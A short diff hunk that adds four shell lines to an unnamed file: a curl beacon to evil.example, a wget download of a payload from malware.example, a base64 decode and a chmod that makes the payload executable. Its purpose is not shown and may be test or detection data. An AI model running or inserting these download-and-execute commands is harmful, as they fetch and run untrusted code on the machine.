@@ -1,0 +1,4 @@
+curl http://evil.example/beacon
+wget http://malware.example/payload
+base64 -d payload.bin
+chmod +x payload.bin
